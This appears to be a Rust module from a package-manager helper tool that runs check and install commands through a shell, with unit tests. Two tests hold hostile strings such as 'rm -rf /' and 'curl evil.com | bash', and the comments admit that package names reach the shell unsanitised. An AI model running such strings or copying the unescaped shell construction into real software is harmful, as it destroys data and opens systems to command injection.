use crate::SantaConfig;
use std::collections::HashMap;
use std::time::Duration;

use colored::*;
use derive_builder::Builder;
use dialoguer::{theme::ColorfulTheme, Confirm};
use serde::{Deserialize, Serialize};
use subprocess::Exec;
use tabular::{Row, Table};
use tokio::process::Command;
use tokio::time::timeout;
use tracing::{debug, error, info, trace};

use crate::data::{KnownSources, Platform, SantaData};

pub mod traits;

const MACHINE_KIND: &str = if cfg!(windows) {
    "windows"
} else if cfg!(unix) {
    "unix"
} else {
    "unknown"
};

#[derive(Clone, Debug)]
pub struct PackageCache {
    pub cache: HashMap<String, Vec<String>>,
}

impl PackageCache {
    pub fn new() -> Self {
        Self::default()
    }

    /// Checks for a package in the cache. This accesses the cache only, and will not modify it.
    #[must_use]
    pub fn check(&self, source: &PackageSource, pkg: &str) -> bool {
        match self.cache.get(&source.name_str()) {
            Some(pkgs) => pkgs.contains(&pkg.to_string()),
            _ => {
                debug!("No package cache for {}", source);
                false
            }
        }
    }

    pub fn cache_for(&mut self, source: &PackageSource) {
        info!("Caching data for {}", source);
        let pkgs = source.packages();
        self.cache.insert(source.name_str(), pkgs.clone());
    }

    /// Async version of cache_for with timeout and better error handling
    pub async fn cache_for_async(&mut self, source: &PackageSource) -> Result<(), anyhow::Error> {
        info!("Async caching data for {}", source);
        let pkgs = source.packages_async().await;
        self.cache.insert(source.name_str(), pkgs.clone());
        Ok(())
    }

    /// Returns all packages for a PackageSource. This will call the PackageSource's check_command and populate the cache if needed.
    /// If the PackageSource can't be found, or the cache population fails, then None will be returned.
    #[must_use]
    pub fn packages_for(cache: &mut PackageCache, source: &PackageSource) -> Option<Vec<String>> {
        let c = cache.clone();
        match c.cache.get(&source.name_str()) {
            Some(pkgs) => {
                trace!("Cache hit");
                Some(pkgs.to_vec())
            }
            None => {
                debug!("Cache miss, filling cache for {}", source.name);
                let pkgs = source.packages();
                cache.cache_for(source);
                Some(pkgs)
                // None
            }
        }
    }
}

#[derive(Serialize, Deserialize, Clone, Debug, Eq, PartialEq, Hash, Builder)]
#[builder(setter(into))]
pub struct SourceOverride {
    platform: Platform,
    pub shell_command: Option<String>,
    pub install_command: Option<String>,
    pub check_command: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Eq, PartialEq, Hash, Builder)]
#[builder(setter(into))]
pub struct PackageSource {
    /// The name of the package manager.
    name: KnownSources,
    /// An icon that represents the package manager.
    emoji: String,
    /// The command that executes the package manager. For example, for npm this is `npm`.
    shell_command: String,
    /// The command that will be run to query the list of installed packages. For example,
    /// for brew this is `brew install`.
    install_command: String,
    /// The command that will be run to query the list of installed packages. For example,
    /// for brew this is `brew leaves --installed-on-request`.
    check_command: String,
    /// A string to prepend to every package name for this source.
    prepend_to_package_name: Option<String>,

    /// Override the commands per platform.
    overrides: Option<Vec<SourceOverride>>,
}

impl PackageSource {
    /// Get the package source name
    #[must_use]
    pub fn name(&self) -> &KnownSources {
        &self.name
    }

    /// Get the package source name as string
    #[must_use]
    pub fn name_str(&self) -> String {
        self.name.to_string()
    }

    /// Get the emoji for this package source
    #[must_use]
    pub fn emoji(&self) -> &str {
        &self.emoji
    }

    /// Get the prepend string for package names
    #[must_use]
    pub fn prepend_to_package_name(&self) -> Option<&String> {
        self.prepend_to_package_name.as_ref()
    }

    /// Get the platform overrides
    #[must_use]
    pub fn overrides(&self) -> Option<&Vec<SourceOverride>> {
        self.overrides.as_ref()
    }

    #[cfg(any(test, feature = "bench"))]
    pub fn new_for_test(
        name: KnownSources,
        emoji: &str,
        shell_command: &str,
        install_command: &str,
        check_command: &str,
        prepend_to_package_name: Option<String>,
        overrides: Option<Vec<SourceOverride>>,
    ) -> Self {
        PackageSource {
            name,
            emoji: emoji.to_string(),
            shell_command: shell_command.to_string(),
            install_command: install_command.to_string(),
            check_command: check_command.to_string(),
            prepend_to_package_name,
            overrides,
        }
    }

    fn exec_check(&self) -> String {
        let check = self.check_command();

        debug!("Running shell command: {}", check);

        let ex: Exec = if MACHINE_KIND != "windows" {
            Exec::shell(check)
        } else {
            Exec::cmd("pwsh.exe").args(&[
                "-NonInteractive",
                "-NoLogo",
                "-NoProfile",
                "-Command",
                &check,
            ])
        };

        match ex.capture() {
            Ok(data) => {
                let val = data.stdout_str();
                return val;
            }
            Err(e) => {
                error!("Subprocess error: {}", e);
                return "".to_string();
            }
        }
    }

    pub fn exec_install(&self, _config: &mut SantaConfig, data: &SantaData, packages: Vec<String>) {
        if !packages.is_empty() {
            let renamed: Vec<String> = packages.iter().map(|p| data.name_for(p, self)).collect();
            let install_command = self.install_packages_command(renamed);

            if Confirm::with_theme(&ColorfulTheme::default())
                .with_prompt(format!("Run '{}'?", install_command))
                .default(true)
                .interact()
                .expect("Failed to get user confirmation")
            {
                let ex: Exec = if MACHINE_KIND != "windows" {
                    Exec::shell(install_command)
                } else {
                    Exec::cmd("pwsh.exe").args(&[
                        "-NonInteractive",
                        "-NoLogo",
                        "-NoProfile",
                        "-Command",
                        &install_command,
                    ])
                };
                match ex.capture() {
                    Ok(data) => {
                        let val = data.stdout_str();
                        println!("{}", val);
                    }
                    Err(e) => {
                        error!("Subprocess error: {}", e);
                    }
                }
            } else {
                println!("To install missing {} packages manually, run:", self);
                println!("{}\n", install_command.bold());
            }
        } else {
            println!("No missing packages for {}", self);
        }
    }

    /// Returns an override for the current platform, if defined.
    #[must_use]
    pub fn get_override_for_current_platform(&self) -> Option<SourceOverride> {
        let current = Platform::current();
        match &self.overrides {
            Some(overrides) => overrides.iter().find(|&o| o.platform == current).cloned(),
            None => None,
        }
    }

    /// Returns the configured shell command, taking into account any platform overrides.
    #[must_use]
    pub fn shell_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => {
                return match ov.shell_command {
                    Some(cmd) => cmd,
                    None => self.shell_command.to_string(),
                };
            }
            None => self.shell_command.to_string(),
        }
    }

    /// Returns the configured install command, taking into account any platform overrides.
    #[must_use]
    pub fn install_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => {
                return match ov.install_command {
                    Some(cmd) => cmd,
                    None => self.install_command.to_string(),
                };
            }
            None => self.shell_command.to_string(),
        }
    }

    #[must_use]
    pub fn install_packages_command(&self, packages: Vec<String>) -> String {
        format!("{} {}", self.install_command, packages.join(" "))
    }

    /// Returns the configured check command, taking into account any platform overrides.
    #[must_use]
    pub fn check_command(&self) -> String {
        match self.get_override_for_current_platform() {
            Some(ov) => {
                debug!("Override found for {}", Platform::current());
                trace!("Override: {:?}", ov);
                return match ov.check_command {
                    Some(cmd) => cmd,
                    None => self.check_command.to_string(),
                };
            }
            None => self.check_command.to_string(),
        }
    }

    #[must_use]
    pub fn packages(&self) -> Vec<String> {
        let pkg_list = self.exec_check();
        let lines = pkg_list.lines();
        let packages: Vec<String> = lines.map(|s| self.adjust_package_name(s)).collect();
        debug!("{} - {} packages installed", self.name, packages.len());
        trace!("{:?}", packages);
        packages
    }

    /// Async version of exec_check using tokio::process with timeout support
    async fn exec_check_async(&self) -> Result<String, anyhow::Error> {
        let check = self.check_command();
        debug!("Running async shell command: {}", check);

        let result = if MACHINE_KIND != "windows" {
            // Use sh -c for Unix systems for better shell compatibility
            timeout(
                Duration::from_secs(30), // 30 second timeout
                Command::new("sh").arg("-c").arg(&check).output(),
            )
            .await
        } else {
            // Use PowerShell for Windows
            timeout(
                Duration::from_secs(30),
                Command::new("pwsh.exe")
                    .args(&[
                        "-NonInteractive",
                        "-NoLogo",
                        "-NoProfile",
                        "-Command",
                        &check,
                    ])
                    .output(),
            )
            .await
        };

        match result {
            Ok(Ok(output)) => {
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    Ok(stdout.to_string())
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    error!("Command failed: {}", stderr);
                    Ok(String::new()) // Return empty string on failure like sync version
                }
            }
            Ok(Err(e)) => {
                error!("Process error: {}", e);
                Ok(String::new())
            }
            Err(_) => {
                error!("Command timed out after 30 seconds: {}", check);
                Ok(String::new())
            }
        }
    }

    /// Async version of packages() with better error handling and performance
    #[must_use]
    pub async fn packages_async(&self) -> Vec<String> {
        match self.exec_check_async().await {
            Ok(pkg_list) => {
                let lines = pkg_list.lines();
                let packages: Vec<String> = lines.map(|s| self.adjust_package_name(s)).collect();
                debug!("{} - {} packages installed", self.name, packages.len());
                trace!("{:?}", packages);
                packages
            }
            Err(e) => {
                error!("Failed to get packages for {}: {}", self.name, e);
                Vec::new()
            }
        }
    }

    #[must_use]
    pub fn adjust_package_name(&self, pkg: &str) -> String {
        match &self.prepend_to_package_name {
            Some(pre) => format!("{}{}", pre, pkg),
            None => pkg.to_string(),
        }
    }

    #[must_use]
    pub fn table(
        &self,
        pkgs: &Vec<String>,
        cache: &PackageCache,
        include_installed: bool,
    ) -> Table {
        let mut table = Table::new("{:<} {:<}");
        for pkg in pkgs {
            let installed = cache.check(self, pkg);
            let emoji = if installed { "✅" } else { "❌" };

            #[allow(clippy::nonminimal_bool)]
            if !installed || (installed && include_installed) {
                table.add_row(Row::new().with_cell(emoji).with_cell(pkg));
            }
        }
        table
    }
}

impl Default for PackageCache {
    fn default() -> Self {
        PackageCache {
            cache: HashMap::new(),
        }
    }
}

impl Default for SourceOverride {
    fn default() -> Self {
        SourceOverride {
            platform: Platform::default(),
            shell_command: None,
            check_command: None,
            install_command: None,
        }
    }
}

impl std::fmt::Display for PackageSource {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} {}", self.emoji, self.name)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::{Arch, KnownSources, Platform, OS};

    fn create_test_source() -> PackageSource {
        PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            None,
            None,
        )
    }

    fn create_test_source_with_overrides() -> PackageSource {
        let override_config = SourceOverride {
            platform: Platform {
                os: OS::Windows,
                arch: Arch::X64,
                distro: None,
            },
            shell_command: Some("pwsh".to_string()),
            install_command: Some("scoop install".to_string()),
            check_command: Some("scoop list".to_string()),
        };

        PackageSource::new_for_test(
            KnownSources::Scoop,
            "🍨",
            "scoop",
            "scoop install",
            "scoop list",
            None,
            Some(vec![override_config]),
        )
    }

    #[test]
    fn test_name_str() {
        let source = create_test_source();
        assert_eq!(source.name_str(), "brew");
    }

    #[test]
    fn test_check_command_no_overrides() {
        let source = create_test_source();
        assert_eq!(source.check_command(), "brew list");
    }

    #[test]
    fn test_install_packages_command() {
        let source = create_test_source();
        let packages = vec!["git".to_string(), "vim".to_string()];
        let command = source.install_packages_command(packages);
        assert_eq!(command, "brew install git vim");
    }

    #[test]
    fn test_adjust_package_name_no_prepend() {
        let source = create_test_source();
        assert_eq!(source.adjust_package_name("git"), "git");
    }

    #[test]
    fn test_adjust_package_name_with_prepend() {
        let mut source = create_test_source();
        source.prepend_to_package_name = Some("prefix.".to_string());
        assert_eq!(source.adjust_package_name("git"), "prefix.git");
    }

    #[test]
    fn test_shell_command_injection_prevention() {
        // Test that dangerous characters in commands are preserved as-is
        // (they should be sanitized during execution, not in storage)
        let dangerous_commands = vec![
            "brew; rm -rf /",
            "brew && curl evil.com | bash",
            "brew $(malicious_command)",
            "brew `dangerous`",
        ];

        for dangerous_cmd in dangerous_commands {
            let source = PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                dangerous_cmd,
                "brew install",
                dangerous_cmd,
                None,
                None,
            );

            // Commands should be stored as-is
            assert_eq!(source.check_command(), dangerous_cmd);

            // But we should note that actual execution needs sanitization
            // This test documents the current behavior - execution sanitization
            // should be added in a separate security improvement
        }
    }

    #[test]
    fn test_package_name_injection_scenarios() {
        let source = create_test_source();
        let dangerous_packages = vec![
            "git; rm -rf /",
            "git && curl evil.com | bash",
            "$(malicious_command)",
            "`dangerous`",
            "../../../etc/passwd",
            "package|evil_command",
        ];

        for dangerous_pkg in dangerous_packages {
            let adjusted = source.adjust_package_name(dangerous_pkg);
            // Currently, package names are passed through unchanged
            // This documents the security vulnerability that needs to be addressed
            assert_eq!(adjusted, dangerous_pkg);
        }

        // Test install command construction with dangerous package names
        let command = source.install_packages_command(vec!["git; rm -rf /".to_string()]);
        assert_eq!(command, "brew install git; rm -rf /");

        // This test shows the injection vulnerability exists and needs fixing
        // A secure implementation would sanitize or escape package names
    }

    #[test]
    fn test_platform_override_selection() {
        let source = create_test_source_with_overrides();

        // Test that overrides are selected correctly
        // Note: This test may fail depending on the current platform
        // In a real implementation, we'd want to mock the platform detection
        let override_result = source.get_override_for_current_platform();

        // The test documents current behavior - platform detection logic exists
        // but needs better testing infrastructure with mocked platforms
        match override_result {
            Some(override_config) => {
                assert_eq!(override_config.platform.os, OS::Windows);
            }
            None => {
                // No override found for current platform - this is also valid
            }
        }
    }

    #[test]
    fn test_package_cache_basic_operations() {
        let cache = PackageCache::new();
        let source = create_test_source();

        // Initially, cache should be empty
        assert!(!cache.check(&source, "git"));

        // After caching, we can't easily test without mocking subprocess execution
        // This documents that the cache needs integration testing with mocked commands
    }

    #[test]
    fn test_source_display() {
        let source = create_test_source();
        let display_string = format!("{}", source);
        assert_eq!(display_string, "🍺 brew");
    }
}
